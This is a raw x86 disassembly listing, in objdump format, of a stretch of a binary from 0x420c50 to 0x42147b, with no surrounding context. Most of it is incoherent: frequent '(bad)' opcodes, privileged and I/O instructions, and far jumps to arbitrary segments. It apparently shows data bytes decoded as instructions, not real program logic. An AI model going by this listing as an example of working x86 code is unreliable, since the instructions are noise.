  420c50:	(bad)  
  420c51:	repz jmp 0x7071:0x22728918
  420c59:	add    BYTE PTR [ecx+0x7],0xa4
  420c5d:	cmp    al,0xf
  420c5f:	(bad)  
  420c60:	inc    DWORD PTR [edi+0x1e]
  420c63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c64:	sti    
  420c65:	xchg   DWORD PTR [edi],edi
  420c67:	ret    0x506f
  420c6a:	mov    al,ds:0x40709e1f
  420c6f:	pop    ebp
  420c70:	(bad)  
  420c71:	fs mov cl,0xd2
  420c74:	pusha  
  420c75:	add    eax,0xeb581c88
  420c7a:	mov    eax,eax
  420c7c:	rcr    BYTE PTR [edx-0x65],0xb6
  420c80:	fwait
  420c81:	and    eax,0x945f49eb
  420c86:	push   esi
  420c87:	es push edi
  420c89:	push   esp
  420c8a:	not    DWORD PTR [ebp-0x44485333]
  420c90:	out    dx,eax
  420c91:	jg     0x420c65
  420c93:	lahf   
  420c94:	jbe    0x420cea
  420c96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  420d13:	add    bl,ah
  420d15:	push   es
  420d16:	add    DWORD PTR [edi-0x1b],esi
  420d19:	ja     0x420d12
  420d1b:	xchg   esi,eax
  420d1c:	popf   
  420d1d:	mov    edx,0xf828c648
  420d22:	jg     0x420d56
  420d24:	and    ah,BYTE PTR [ebp+0x76b0001]
  420d2a:	add    BYTE PTR [eax],al
  420d2c:	into   
  420d2d:	fldcw  WORD PTR [eax]
  420d2f:	pop    ds
  420d30:	loope  0x420cb3
  420d32:	and    DWORD PTR [ebx],esi
  420d34:	pop    eax
  420d35:	push   edx
  420d36:	mov    cl,0xa
  420d38:	in     eax,dx
  420d39:	fsub   DWORD PTR [eax+0x15]
  420d3c:	pop    ss
  420d3d:	and    edi,DWORD PTR [edi-0x29c20733]
  420d43:	jb     0x420d53
  420d45:	jae    0x420cec
  420d47:	bound  ebp,QWORD PTR [edx]
  420d49:	dec    ebp
  420d4a:	test   DWORD PTR [ecx-0x3312a330],edx
  420d50:	cwde   
  420d51:	push   ds
  420d52:	sub    al,0xd4
  420d54:	and    eax,0x49586a54
  420d59:	add    eax,0xe4ed79a0
  420d5e:	sbb    esp,DWORD PTR [ebx-0x5f]
  420d61:	sti    
  420d62:	dec    ebp
  420d63:	ds pop esp
  420d65:	mov    bl,0xba
  420d67:	xor    al,0x2d
  420d69:	mov    BYTE PTR [esi+0x2d],dh
  420d6c:	pop    es
  420d6d:	popf   
  420d6e:	(bad)  
  420d6f:	(bad)  [edx]
  420d71:	xchg   DWORD PTR [ecx],edx
  420d73:	and    ebp,ebx
  420d75:	mov    edi,0x9c04ed6f
  420d7a:	cmp    ebp,esp
  420d7c:	sub    BYTE PTR [edx-0x62b2db02],bh
  420d82:	cwde   
  420d83:	xor    dl,BYTE PTR [esi]
  420d85:	jno    0x420d24
  420d87:	mov    esi,DWORD PTR ds:0x561f65e4
  420d8d:	xchg   ecx,eax
  420d8e:	loopne 0x420de0
  420d90:	lahf   
  420d91:	cmp    BYTE PTR [ecx+0x79],bl
  420d94:	pop    edi
  420d95:	or     ebp,DWORD PTR [ecx]
  420d97:	or     BYTE PTR es:[edi],bh
  420d9a:	adc    bl,dh
  420d9c:	ins    DWORD PTR es:[edi],dx
  420d9d:	mov    DWORD PTR [ecx-0x357ea9ba],esp
  420da3:	(bad)  
  420da4:	or     ecx,DWORD PTR [ebx-0x19]
  420da7:	in     al,0x6c
  420da9:	inc    ebx
  420daa:	pop    ecx
  420dab:	xor    eax,0xf13338ca
  420db0:	mov    edi,0xf720da3e
  420db5:	(bad)
  420db8:	add    eax,0x7d93b833
  420dbd:	fs add al,0xe9
  420dc0:	push   es
  420dc1:	xor    ecx,DWORD PTR [eax]
  420dc3:	and    bl,ah
  420dc5:	rcr    DWORD PTR [edx+0x511699bd],1
  420dcb:	cmp    al,0xd1
  420dcd:	push   eax
  420dce:	jne    0x420dcf
  420dd0:	in     al,0xe7
  420dd2:	sub    BYTE PTR [esp+ebp*4],0xc6
  420dd6:	nop
  420dd7:	or     esp,DWORD PTR [edi]
  420dd9:	mov    BYTE PTR [ecx-0x6b1f51e8],dl
  420ddf:	sub    al,0x7e
  420de1:	aaa    
  420de2:	mov    edi,0xbd6d14a6
  420de7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420de8:	and    BYTE PTR [edx+eiz*8],dh
  420deb:	mov    esi,0xc4c8b871
  420df0:	pop    edx
  420df1:	std    
  420df2:	loop   0x420db6
  420df4:	neg    BYTE PTR [edi]
  420df6:	leave  
  420df7:	dec    ebx
  420df8:	mov    al,0xbc
  420dfa:	pop    ds
  420dfb:	jbe    0x420e13
  420dfd:	icebp  
  420dfe:	cld    
  420dff:	xchg   DWORD PTR [ebp-0x2fbeea63],esi
  420e05:	xor    BYTE PTR [ebx+0x29],bh
  420e08:	dec    edi
  420e09:	(bad)  
  420e0a:	mov    bl,0x68
  420e0c:	iret   
  420e0d:	shl    DWORD PTR [eax+eax*8-0x30],0x70
  420e12:	int    0xd2
  420e14:	fiadd  WORD PTR [edx]
  420e16:	add    eax,0x9d164e0e
  420e1b:	jp     0x420e2f
  420e1d:	dec    eax
  420e1e:	bound  edi,QWORD PTR [ebx-0x1c28444c]
  420e24:	jp     0x420e6d
  420e26:	add    cl,BYTE PTR [esi]
  420e28:	sti    
  420e29:	push   es
  420e2a:	inc    esi
  420e2b:	es inc edx
  420e2d:	push   ss
  420e2e:	pop    esp
  420e2f:	dec    ebx
  420e30:	imul   eax,DWORD PTR [edx+0x4c],0x40
  420e34:	repz and ebp,DWORD PTR [esi+esi*4-0x6c5f1e67]
  420e3c:	ret    0x9eec
  420e3f:	rcl    BYTE PTR [ebx-0x1221693a],cl
  420e45:	retf   
  420e46:	ret    0xb1c4
  420e49:	xor    DWORD PTR [esi+0x3],0xffffff8f
  420e4d:	xchg   ebx,eax
  420e4e:	cs ds loop 0x420ec9
  420e52:	fild   WORD PTR [eax-0x14]
  420e55:	mov    dl,0x4e
  420e57:	xchg   ebx,eax
  420e58:	xor    bl,BYTE PTR [ebx-0x2a19b1d8]
  420e5e:	inc    esi
  420e5f:	or     cl,al
  420e61:	xor    DWORD PTR [edi-0x52d0d533],0xdcf913a6
  420e6b:	cli    
  420e6c:	sbb    eax,0x3948c0ba
  420e71:	ds mov edi,gs
  420e74:	and    eax,0xf749c2e
  420e79:	retf   0xc742
  420e7c:	stc    
  420e7d:	repz pop esp
  420e7f:	and    al,0xc0
  420e81:	adc    BYTE PTR [esi-0x3a],bh
  420e84:	cdq    
  420e85:	dec    ebp
  420e86:	pop    ss
  420e87:	jmp    0x6e8b:0xb69def78
  420e8e:	mov    ebp,0xc7e2ed4a
  420e93:	adc    BYTE PTR [ecx+0x27],bl
  420e96:	sub    DWORD PTR [eax+0x7b],edx
  420e99:	push   0xfffffffd
  420e9b:	iret   
  420e9c:	push   ebp
  420e9d:	jns    0x420f17
  420e9f:	sbb    BYTE PTR [ebx-0x4bbec1e7],bl
  420ea5:	mov    dh,0xa9
  420ea7:	mov    ah,0x4
  420ea9:	push   eax
  420eaa:	mov    al,BYTE PTR [ebp+0x6e]
  420ead:	ja     0x420e3b
  420eaf:	or     DWORD PTR [ebp+0x441bf3f4],0xc
  420eb6:	fisub  DWORD PTR [ecx-0x19]
  420eb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420eba:	push   ds
  420ebb:	fist   WORD PTR [ecx-0x43213ecc]
  420ec1:	fild   QWORD PTR ds:0xcea269a2
  420ec7:	xor    ah,BYTE PTR ds:0x6c04e473
  420ecd:	xchg   edx,eax
  420ece:	inc    ebp
  420ecf:	mov    ds:0x77aaaa49,eax
  420ed4:	or     eax,0x87430ef7
  420ed9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420eda:	xor    bh,dl
  420edc:	out    dx,al
  420edd:	es cmp al,0x82
  420ee0:	jmp    0x420e7a
  420ee2:	jo     0x420f10
  420ee4:	sbb    ah,al
  420ee6:	push   ds
  420ee7:	icebp  
  420ee8:	lds    ebx,FWORD PTR [esi-0x5e]
  420eeb:	into   
  420eec:	inc    ebx
  420eed:	xor    al,0x62
  420eef:	rcl    BYTE PTR [edx+0x10f8b3d],cl
  420ef5:	mov    al,BYTE PTR [ecx]
  420ef7:	push   es
  420ef8:	and    DWORD PTR ds:0xd4429e43,esp
  420efe:	repz mov edi,0xa47d9cad
  420f04:	inc    esp
  420f05:	add    bh,BYTE PTR [edx+edx*8]
  420f08:	jno    0x420efe
  420f0a:	lds    esi,FWORD PTR [esi-0x70]
  420f0d:	and    edx,DWORD PTR [edx]
  420f0f:	push   edi
  420f10:	nop
  420f11:	test   DWORD PTR [edi],esp
  420f13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f14:	push   edx
  420f15:	ficom  WORD PTR [edi]
  420f17:	push   es
  420f18:	jg     0x420f74
  420f1a:	repnz xor DWORD PTR [edi],ebp
  420f1d:	ret    
  420f1e:	int    0x62
  420f20:	lea    edx,[ebx]
  420f22:	fisubr WORD PTR ds:0x3bb2c234
  420f28:	(bad)  
  420f29:	lock push esi
  420f2b:	repz mov ?,WORD PTR [edi-0x5c]
  420f2f:	jae    0x420ed3
  420f31:	sahf   
  420f32:	push   ebp
  420f33:	mov    esi,0x56fa09e4
  420f38:	outs   dx,DWORD PTR ds:[esi]
  420f39:	das    
  420f3a:	call   0x33d7:0x27d8
  420f40:	ds cwde 
  420f42:	aaa    
  420f43:	scas   al,BYTE PTR es:[edi]
  420f44:	jb     0x420fa2
  420f46:	adc    bl,al
  420f48:	clc    
  420f49:	mov    bl,0x7e
  420f4b:	push   edi
  420f4c:	mov    eax,0x5a390f36
  420f51:	fwait
  420f52:	sbb    al,0x37
  420f54:	push   edi
  420f55:	mov    eax,0x9cb11ccd
  420f5a:	mov    edx,0xf52a40c
  420f5f:	cli    
  420f60:	cmp    eax,0xa9142693
  420f65:	rcr    DWORD PTR [edx+0x76],1
  420f68:	mov    dh,0xf8
  420f6a:	out    dx,al
  420f6b:	loopne 0x420f3e
  420f6d:	fcom   QWORD PTR [ecx+0x4a]
  420f70:	pop    eax
  420f71:	sub    eax,0x3e98405f
  420f76:	daa    
  420f77:	push   ss
  420f78:	xor    ch,0x4c
  420f7b:	cmp    WORD PTR [esi-0x1a],0x47bd
  420f81:	repz and dh,cl
  420f84:	sub    DWORD PTR [ebx-0x2b],edx
  420f87:	or     cl,BYTE PTR [edi-0x4b]
  420f8a:	cli    
  420f8b:	nop
  420f8c:	test   cl,bl
  420f8e:	out    dx,eax
  420f8f:	sub    DWORD PTR [eax+0x642e7f59],edi
  420f95:	int3   
  420f96:	xchg   DWORD PTR [esi+0x730ed0a8],edi
  420f9c:	fiadd  DWORD PTR [esi-0x33]
  420f9f:	in     eax,0x1d
  420fa1:	fldcw  WORD PTR [edx+0x53]
  420fa4:	jecxz  0x420faa
  420fa6:	jl     0x420f81
  420fa8:	mov    al,ds:0x2a06e962
  420fad:	mov    al,ch
  420faf:	mov    cl,0x5c
  420fb1:	push   edx
  420fb2:	push   ebp
  420fb3:	out    dx,eax
  420fb4:	mov    al,0xf9
  420fb6:	pop    edi
  420fb7:	pop    edi
  420fb8:	scas   al,BYTE PTR es:[edi]
  420fb9:	dec    ebp
  420fba:	icebp  
  420fbb:	scas   al,BYTE PTR es:[edi]
  420fbc:	mov    esp,esp
  420fbe:	les    esi,FWORD PTR [edi]
  420fc0:	test   DWORD PTR [edx-0x3b2324b8],0x7a0ca74a
  420fca:	mul    BYTE PTR [edx+0x6292d61e]
  420fd0:	inc    edi
  420fd1:	sub    ah,BYTE PTR [eax]
  420fd3:	pop    edi
  420fd4:	sar    DWORD PTR [ebx-0x3ec35723],0x48
  420fdb:	jg     0x42104b
  420fdd:	cmp    eax,0x41fc585a
  420fe2:	cmp    BYTE PTR [esi-0x3d56c336],bh
  420fe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fe9:	sbb    edx,DWORD PTR [ebx-0x6]
  420fec:	sahf   
  420fed:	or     BYTE PTR [eax-0x61da9ab6],dl
  420ff3:	lahf   
  420ff4:	mov    bl,BYTE PTR [edx]
  420ff6:	fbstp  TBYTE PTR [ebp-0x2d0b8d3f]
  420ffc:	mov    ecx,0x17698561
  421001:	mov    esi,0xa7f16460
  421006:	(bad)  
  421007:	sbb    al,0xfc
  421009:	fld    TBYTE PTR [esi]
  42100b:	retf   
  42100c:	xor    ebp,DWORD PTR [edx-0x6356821]
  421012:	pop    edi
  421013:	xchg   esp,eax
  421014:	mov    ?,WORD PTR [edi]
  421016:	and    DWORD PTR [ebp+0x37938af2],eax
  42101c:	pop    ebx
  42101d:	in     eax,0x90
  42101f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421020:	loopne 0x421087
  421022:	adc    al,0x11
  421024:	jns    0x421072
  421026:	adc    esp,DWORD PTR [edi]
  421028:	mov    dh,0x87
  42102a:	push   ecx
  42102b:	(bad)  
  42102c:	push   ss
  42102d:	inc    esi
  42102e:	or     ah,BYTE PTR [ebp+0x2f]
  421031:	mov    dl,0xdc
  421033:	daa    
  421034:	mov    esp,0x4adb825a
  421039:	add    cl,bh
  42103b:	gs xor al,ch
  42103e:	sub    al,0xae
  421040:	push   esp
  421041:	aas    
  421042:	sub    BYTE PTR [esi],dh
  421044:	jne    0x420fc8
  421046:	sub    dl,dh
  421048:	add    bh,ah
  42104a:	pop    ds
  42104b:	aad    0x57
  42104d:	mov    dh,0x95
  42104f:	aas    
  421050:	int3   
  421051:	xchg   esi,eax
  421052:	fwait
  421053:	jge    0x421012
  421055:	jge    0x421001
  421057:	adc    esi,eax
  421059:	or     eax,0xbe4ed416
  42105e:	mov    dh,0x97
  421060:	je     0x4210b4
  421062:	lods   eax,DWORD PTR ds:[esi]
  421063:	lahf   
  421064:	sub    BYTE PTR [edi+0x1d],dl
  421067:	pop    ss
  421068:	jmp    0x421091
  42106a:	mov    esp,0x18f856c0
  42106f:	jno    0x4210d8
  421071:	cmp    ch,BYTE PTR [esi-0x13]
  421074:	mov    cs,ebp
  421076:	xor    al,0x32
  421078:	cmc    
  421079:	or     eax,0x2de8d5f0
  42107e:	sbb    eax,0x96e95df3
  421083:	scas   al,BYTE PTR es:[edi]
  421084:	inc    ebp
  421085:	in     al,dx
  421086:	inc    esp
  421087:	loope  0x421063
  421089:	xchg   edi,eax
  42108a:	cmp    eax,0x2475c2af
  42108f:	jp     0x4210cb
  421091:	out    0x6b,eax
  421093:	cs retf 
  421095:	jge    0x4210ec
  421097:	ins    BYTE PTR es:[edi],dx
  421098:	inc    edi
  421099:	inc    esp
  42109a:	scas   al,BYTE PTR es:[edi]
  42109b:	je     0x42110f
  42109d:	std    
  42109e:	test   DWORD PTR ss:[ebp+0x4d],ecx
  4210a2:	pop    es
  4210a3:	mov    edx,0x166e8d0b
  4210a8:	jl     0x4210aa
  4210aa:	aaa    
  4210ab:	inc    esi
  4210ac:	leave  
  4210ad:	js     0x4210b4
  4210af:	push   DWORD PTR [ebp-0x26]
  4210b2:	imul   esi,DWORD PTR [ebx+0x51],0x4b
  4210b6:	xchg   esi,eax
  4210b7:	fsub   DWORD PTR [ecx+0x718927e]
  4210bd:	in     al,dx
  4210be:	pop    ecx
  4210bf:	jno    0x42112d
  4210c1:	mov    dh,0xb3
  4210c3:	lods   al,BYTE PTR ds:[esi]
  4210c4:	fld    TBYTE PTR es:[edi+0x527536b8]
  4210cb:	push   ds
  4210cc:	fs ret 
  4210ce:	lds    esp,FWORD PTR [eax]
  4210d0:	int    0x3
  4210d2:	into   
  4210d3:	and    eax,0xca359cde
  4210d8:	popa   
  4210d9:	ret    0xaa1e
  4210dc:	jecxz  0x421121
  4210de:	sub    bl,ah
  4210e0:	add    BYTE PTR [esi-0x103ea71e],0x38
  4210e7:	(bad)  
  4210e9:	(bad)  
  4210eb:	je     0x42116b
  4210ed:	cwde   
  4210ee:	mov    ch,0x13
  4210f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210f1:	(bad)  
  4210f2:	ffreep st(5)
  4210f4:	repnz in eax,0xda
  4210f7:	call   0x7063:0x6cb41f39
  4210fe:	sbb    esp,edi
  421100:	jp     0x4210df
  421102:	ret    0xd6d9
  421105:	mov    BYTE PTR [edi+0x14],bh
  421108:	sbb    ebp,edx
  42110a:	lock repnz xchg edx,eax
  42110d:	cmp    dh,BYTE PTR [ebx-0x2b5f38c7]
  421113:	push   0x21
  421115:	aam    0xb8
  421117:	fld    QWORD PTR [esp+edx*8+0x4e]
  42111b:	or     DWORD PTR [ebp+0x36],0x8081b071
  421122:	das    
  421123:	adc    DWORD PTR [ecx+ecx*1+0x5b],edx
  421127:	in     eax,dx
  421128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421129:	adc    al,0xe6
  42112b:	mov    ebp,DWORD PTR [esi+edi*4-0xe607ae3]
  421132:	(bad)  
  421133:	ficom  WORD PTR [ecx+0x2ca6ecc8]
  421139:	pop    ss
  42113a:	test   al,0xfc
  42113c:	xchg   esi,eax
  42113d:	mov    ch,BYTE PTR [eax]
  42113f:	lea    ebx,[ecx-0x22]
  421142:	pop    esp
  421143:	xchg   ebx,eax
  421144:	es push ebx
  421146:	mov    dh,0x73
  421148:	jnp    0x42117b
  42114a:	or     BYTE PTR [edi-0x7d],al
  42114d:	mov    ebp,0xe58c2b03
  421152:	(bad)  
  421153:	cmc    
  421154:	inc    ebp
  421155:	rol    BYTE PTR [esi],1
  421157:	in     eax,dx
  421158:	adc    al,0xc3
  42115a:	ret    0xd261
  42115d:	inc    ebp
  42115e:	push   ss
  42115f:	mov    esp,0x64e44aa
  421164:	lock imul edi,DWORD PTR [ecx+0x2cc84058],0xffffff80
  42116c:	loope  0x421127
  42116e:	jmp    0xd94aef3a
  421173:	repz add eax,0x59cd4c1f
  421179:	retf   
  42117a:	ja     0x42114c
  42117c:	add    ah,BYTE PTR es:[ecx+0x18d0e0f2]
  421183:	jo     0x4211a6
  421185:	cmp    eax,0xcaf4da4c
  42118a:	push   esi
  42118b:	cmp    DWORD PTR [esi-0x28],esi
  42118e:	aaa    
  42118f:	lea    eax,[eax-0x2a2c4005]
  421195:	sbb    al,0xb3
  421197:	iret   
  421198:	mov    fs,WORD PTR [esi+0x7b]
  42119b:	fisttp QWORD PTR [esi+0x31]
  42119e:	xor    dl,BYTE PTR [edi+0x6d]
  4211a1:	pop    ds
  4211a2:	xlat   BYTE PTR ds:[ebx]
  4211a3:	jns    0x4211a8
  4211a5:	or     al,0x63
  4211a7:	arpl   WORD PTR [eax],ax
  4211a9:	cmp    DWORD PTR [edx+ebp*1-0x36],ecx
  4211ad:	cmp    dh,cl
  4211af:	ja     0x421151
  4211b1:	jae    0x42120b
  4211b3:	dec    edi
  4211b4:	lds    ecx,FWORD PTR [esi-0x4d]
  4211b7:	dec    esp
  4211b8:	pop    edx
  4211b9:	pop    ebx
  4211ba:	xor    BYTE PTR [ecx],ch
  4211bc:	or     esp,eax
  4211be:	mov    al,ds:0xab657a89
  4211c3:	outs   dx,DWORD PTR ds:[esi]
  4211c4:	loopne 0x421178
  4211c6:	js     0x4211e9
  4211c8:	inc    ebp
  4211c9:	pusha  
  4211ca:	aas    
  4211cb:	jo     0x4211c6
  4211cd:	pop    edx
  4211ce:	addr16 inc esi
  4211d0:	jmp    0x6692:0xc9adadfb
  4211d7:	push   edi
  4211d8:	(bad)  
  4211d9:	dec    edi
  4211da:	inc    eax
  4211db:	lods   eax,DWORD PTR ds:[si]
  4211dd:	dec    edx
  4211de:	int3   
  4211df:	inc    ebx
  4211e0:	cmp    eax,0x3705e621
  4211e5:	pop    ebx
  4211e6:	add    DWORD PTR [edi+0x5a],esi
  4211e9:	pop    eax
  4211ea:	test   DWORD PTR [esp+esi*8],ecx
  4211ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211ee:	jbe    0x421185
  4211f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211f1:	(bad)  
  4211f2:	ins    DWORD PTR es:[edi],dx
  4211f3:	sti    
  4211f4:	mov    eax,0xdb9b251b
  4211f9:	add    al,0x44
  4211fb:	daa    
  4211fc:	xlat   BYTE PTR ds:[ebx]
  4211fd:	push   ecx
  4211fe:	mov    cl,0x50
  421200:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421201:	xabort 0xf
  421204:	loop   0x4211fd
  421206:	jmp    0x42126f
  421208:	mov    dh,0x3b
  42120a:	(bad)  [esi+0x61]
  42120d:	push   eax
  42120e:	fimul  WORD PTR [eax+edx*8]
  421211:	mov    al,0xdb
  421213:	xor    DWORD PTR [esi],eax
  421215:	jb     0x4211bf
  421217:	fidivr WORD PTR [eax]
  421219:	dec    edi
  42121a:	mov    esi,0xfb172ed9
  42121f:	pop    edx
  421220:	add    eax,0x10043d9
  421225:	imul   ecx,ebp,0x66
  421228:	not    BYTE PTR [eax+0x44]
  42122b:	aas    
  42122c:	adc    eax,0x5ef4c762
  421231:	sub    eax,0xe0a44610
  421236:	inc    edi
  421237:	xchg   esp,eax
  421238:	sar    ah,1
  42123a:	jb     0x4212b8
  42123c:	pop    ecx
  42123d:	ins    BYTE PTR es:[edi],dx
  42123e:	hlt    
  42123f:	inc    edi
  421240:	add    al,0x51
  421242:	fild   DWORD PTR [edi-0x3a]
  421245:	sub    al,0x8
  421247:	(bad)  
  421248:	sub    dh,BYTE PTR ds:0x1f4f8134
  42124e:	dec    eax
  42124f:	jb     0x4211fc
  421251:	aaa    
  421252:	ss scas eax,DWORD PTR es:[edi]
  421254:	aad    0x4
  421256:	inc    bl
  421258:	cmp    BYTE PTR [ebp+0x41],cl
  42125b:	ror    ebp,cl
  42125d:	mov    cl,0xa4
  42125f:	push   edi
  421260:	dec    esp
  421261:	jbe    0x4212c7
  421263:	cld    
  421264:	adc    DWORD PTR [eax+0x5c],ecx
  421267:	xchg   BYTE PTR [eax],dh
  421269:	mov    cl,0x16
  42126b:	sar    DWORD PTR [edx],cl
  42126d:	mov    eax,0x224e437
  421272:	pop    ecx
  421273:	adc    eax,0xaa5b831d
  421278:	jmp    0x421282
  42127a:	and    esi,DWORD PTR [esi+0x2e]
  42127d:	xor    eax,0xc6f5f73f
  421282:	ret    
  421283:	mov    al,ds:0x155ef7e2
  421288:	pop    ss
  421289:	cmc    
  42128a:	das    
  42128b:	add    ah,ah
  42128d:	or     eax,0x147fb321
  421292:	mov    al,ds:0xa31dc65b
  421297:	sti    
  421298:	retf   
  421299:	mov    ebp,ecx
  42129b:	adc    edi,DWORD PTR [ecx]
  42129d:	pop    es
  42129e:	pop    esi
  42129f:	lods   al,BYTE PTR ds:[esi]
  4212a0:	(bad)
  4212a3:	retf   0x3e2
  4212a6:	jo     0x42122a
  4212a8:	in     eax,dx
  4212a9:	sbb    DWORD PTR ds:0x285e4e55,esp
  4212af:	push   0x2c
  4212b1:	push   cs
  4212b2:	dec    eax
  4212b3:	nop
  4212b4:	leave  
  4212b5:	push   ebx
  4212b6:	and    ebx,ebx
  4212b8:	and    BYTE PTR [ebx+0x47de1eb7],cl
  4212be:	loopne 0x4212a0
  4212c0:	mov    ebx,0xca775d0f
  4212c5:	test   eax,0x78810a60
  4212ca:	mov    ds:0x2c04a510,al
  4212cf:	mov    eax,ss:0xe7bb127e
  4212d5:	adc    BYTE PTR [ebp-0x46],0x42
  4212d9:	(bad)  
  4212da:	adc    ebp,DWORD PTR [ecx+0x43]
  4212dd:	adc    BYTE PTR [edx-0x53],dl
  4212e0:	cmp    ebx,DWORD PTR [ecx-0x5ab61586]
  4212e6:	mov    esi,0x436fa33b
  4212eb:	mov    ebp,0x916e1771
  4212f0:	or     bl,ch
  4212f2:	add    ecx,ecx
  4212f4:	xor    ah,BYTE PTR [edx+0x5c]
  4212f7:	int    0xbd
  4212f9:	push   edi
  4212fa:	scas   eax,DWORD PTR es:[edi]
  4212fb:	inc    esi
  4212fc:	fcmovnbe st,st(4)
  4212fe:	daa    
  4212ff:	pusha  
  421300:	aam    0xa8
  421302:	xor    al,0xf0
  421304:	test   DWORD PTR [eax+0x9963a42],ebp
  42130a:	mov    ebp,0x95c2a5f0
  42130f:	retf   0x5f7e
  421312:	push   0x66
  421314:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421315:	(bad)  
  421317:	pop    ss
  421318:	(bad)
  42131b:	fnsave [ebp+0x2c]
  42131e:	push   0xffffffe1
  421320:	imul   ecx,DWORD PTR [edx-0xb39e7e1],0x4a85c299
  42132a:	fs sub ah,dl
  42132d:	imul   dl
  42132f:	adc    BYTE PTR [edi],0xb9
  421332:	sbb    al,dl
  421334:	mov    edx,0x4f3fcabd
  421339:	pop    eax
  42133a:	hlt    
  42133b:	mul    BYTE PTR [ecx+0x40]
  42133e:	hlt    
  42133f:	jno    0x421306
  421341:	int    0x1c
  421343:	repnz push eax
  421345:	pop    edx
  421346:	xor    al,0x75
  421348:	lods   eax,DWORD PTR ds:[esi]
  421349:	ja     0x4213af
  42134b:	into   
  42134c:	mov    bh,0x3c
  42134e:	cdq    
  42134f:	add    DWORD PTR [edx-0x8],esp
  421352:	(bad)
  421356:	sub    al,0xaf
  421358:	jmp    0x4b6c:0x4e26b70f
  42135f:	ss stos DWORD PTR es:[edi],eax
  421361:	ror    BYTE PTR ds:0x589bd9f8,1
  421367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421368:	sti    
  421369:	xchg   edx,eax
  42136a:	push   0xffffff8a
  42136c:	addps  xmm5,XMMWORD PTR ds:0x3ab7ec48
  421373:	sub    esi,DWORD PTR [esp+edi*8+0x2135360f]
  42137a:	bt     DWORD PTR [ebx+esi*4+0x1a4cb10c],ebx
  421382:	fcmovne st,st(2)
  421384:	dec    edx
  421385:	ret    0x6655
  421388:	inc    ecx
  421389:	addr16 cmp esp,esp
  42138c:	pop    ebp
  42138d:	and    al,0xb6
  42138f:	fimul  WORD PTR [eax]
  421391:	jge    0x42133d
  421393:	iret   
  421394:	stos   DWORD PTR es:[edi],eax
  421395:	mov    bl,0x9b
  421397:	aas    
  421398:	mov    edi,0xcf1b0ded
  42139d:	jle    0x42136c
  42139f:	pop    es
  4213a0:	lock inc esi
  4213a2:	fldpi  
  4213a4:	lods   eax,DWORD PTR ds:[esi]
  4213a5:	sub    BYTE PTR [edi+0x0],0xa3
  4213a9:	mov    ebx,0xf92d84bb
  4213ae:	fwait
  4213af:	jb     0x42136d
  4213b1:	jb     0x4213c4
  4213b3:	pop    ebp
  4213b4:	shr    ebp,0xb1
  4213b7:	dec    ecx
  4213b8:	mov    al,ds:0x397808a8
  4213bd:	pop    ebx
  4213be:	ds in  al,dx
  4213c0:	and    dl,dh
  4213c2:	out    dx,al
  4213c3:	xchg   ebx,eax
  4213c4:	sub    ch,BYTE PTR [esi+0x5abf1a4b]
  4213ca:	test   al,0x3f
  4213cc:	add    al,0xc0
  4213ce:	jp     0x4213a0
  4213d0:	or     DWORD PTR [edx-0x243d3f4c],esp
  4213d6:	call   0x3b89:0x31b63b42
  4213dd:	outs   dx,BYTE PTR ds:[esi]
  4213de:	mov    ds:0x1adbdb22,al
  4213e3:	cwde   
  4213e4:	cmp    al,0x91
  4213e6:	push   edx
  4213e7:	ja     0x4213b5
  4213e9:	mov    ebp,0xb8fcd127
  4213ee:	mov    dl,0x2e
  4213f0:	leave  
  4213f1:	pop    es
  4213f2:	test   al,0xed
  4213f4:	xchg   ecx,eax
  4213f5:	inc    ebp
  4213f6:	xor    dh,bl
  4213f8:	or     esi,ebx
  4213fa:	jnp    0x421447
  4213fc:	xchg   edi,eax
  4213fd:	pop    eax
  4213fe:	mov    edx,DWORD PTR [edi+0x3537d446]
  421404:	pushf  
  421405:	fidivr WORD PTR [ebx-0x1b]
  421408:	dec    ebx
  421409:	data16 and al,0xba
  42140c:	pop    eax
  42140d:	(bad)  
  42140e:	dec    esp
  42140f:	gs popa 
  421411:	hlt    
  421412:	mov    WORD PTR [esi+0x33],cs
  421415:	xchg   ebx,eax
  421416:	das    
  421417:	pop    ss
  421418:	cmp    ebx,DWORD PTR es:[esi+0x4f3d21e7]
  42141f:	stc    
  421420:	adc    eax,0x9d8c35c7
  421425:	push   eax
  421426:	mov    edi,0xd97a7aef
  42142b:	dec    edi
  42142c:	das    
  42142d:	push   ebp
  42142e:	icebp  
  42142f:	aam    0x81
  421431:	or     eax,0xf53833f5
  421436:	inc    eax
  421437:	xlat   BYTE PTR ds:[ebx]
  421438:	cmc    
  421439:	push   edx
  42143a:	pop    es
  42143b:	jns    0x421411
  42143d:	mov    WORD PTR [ebp+0x2b412cf9],ds
  421443:	or     DWORD PTR [esp+ecx*4],ebp
  421446:	mov    dh,0xbe
  421448:	iret   
  421449:	xor    DWORD PTR [ebx+ebx*2-0x66],ebp
  42144d:	xchg   ebp,eax
  42144e:	pop    esi
  42144f:	or     BYTE PTR [edx+eax*2-0xa],al
  421453:	ins    DWORD PTR es:[edi],dx
  421454:	hlt    
  421455:	cld    
  421456:	dec    edx
  421457:	int3   
  421458:	and    dh,bl
  42145a:	mov    dl,0x95
  42145c:	pop    edi
  42145d:	inc    esi
  42145e:	inc    esp
  42145f:	add    BYTE PTR [ebp-0x35],cl
  421462:	in     al,dx
  421463:	cmp    eax,0x4b3a9004
  421468:	mov    eax,ds:0x5dc66852
  42146d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42146e:	push   ecx
  42146f:	adc    DWORD PTR fs:[ebp+0x3643848e],ecx
  421476:	mov    cl,0xad
  421478:	retf   
  421479:	jecxz  0x4214b0
  42147b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
